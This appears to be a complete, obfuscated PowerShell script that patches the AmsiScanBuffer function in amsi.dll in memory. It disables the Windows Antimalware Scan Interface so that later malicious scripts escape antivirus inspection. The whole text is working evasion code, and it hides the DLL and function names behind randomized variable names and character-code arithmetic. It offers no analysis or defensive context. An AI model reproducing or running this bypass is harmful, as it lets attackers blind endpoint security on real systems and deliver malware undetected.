$DbAi8uA0AgSoK = @"
using System;
using System.Runtime.InteropServices;
public class DbAi8uA0AgSoK {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr VOwseyeZsTsmfi, string ZnJjSy1V);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr FYYsIjFyMNTY, UIntPtr G2HHhL92Ksp, uint u5VTTjV, out uint vKlBF6xu);
}
"@

Add-Type $DbAi8uA0AgSoK

$Y2Q5jFjiaS = [DbAi8uA0AgSoK]::LoadLibrary("$([chAr]([bYTe]0x61)+[CHAR](90+19)+[char]([BytE]0x73)+[ChAr](17+88)+[Char]([BYte]0x2e)+[cHar](100)+[chAr]([ByTe]0x6c)+[cHAR]([BYtE]0x6c))")
$YjvcQ3PiDkplK8Pl1Wzp = [DbAi8uA0AgSoK]::GetProcAddress($Y2Q5jFjiaS, "$(('ÄmsìSc'+'ánBúff'+'ér').nORmalizE([CHar]([BYTE]0x46)+[cHAr]([bYte]0x6f)+[ChaR]([BYTe]0x72)+[ChAr](109)+[char]([bytE]0x44)) -replace [cHAr](92*74/74)+[char](112*64/64)+[cHAr]([byte]0x7b)+[CHAr]([byte]0x4d)+[ChAr](35+75)+[cHaR](125+107-107))")
$p = 0
[DbAi8uA0AgSoK]::VirtualProtect($YjvcQ3PiDkplK8Pl1Wzp, [uint32]5, 0x40, [ref]$p)
$IC8DZDuHQYntgVkzQRp = "0xB8"
$FDS = "0x57"
$Y7V4aLu_juT3BcP = "0x00"
$jhMFYj = "0x07"
$a84KMDCBrutSnyD = "0x80"
$v01mj = "0xC3"
$cWL = [Byte[]] ($IC8DZDuHQYntgVkzQRp,$FDS,$Y7V4aLu_juT3BcP,$jhMFYj,+$a84KMDCBrutSnyD,+$v01mj)
[System.Runtime.InteropServices.Marshal]::Copy($cWL, 0, $YjvcQ3PiDkplK8Pl1Wzp, 6)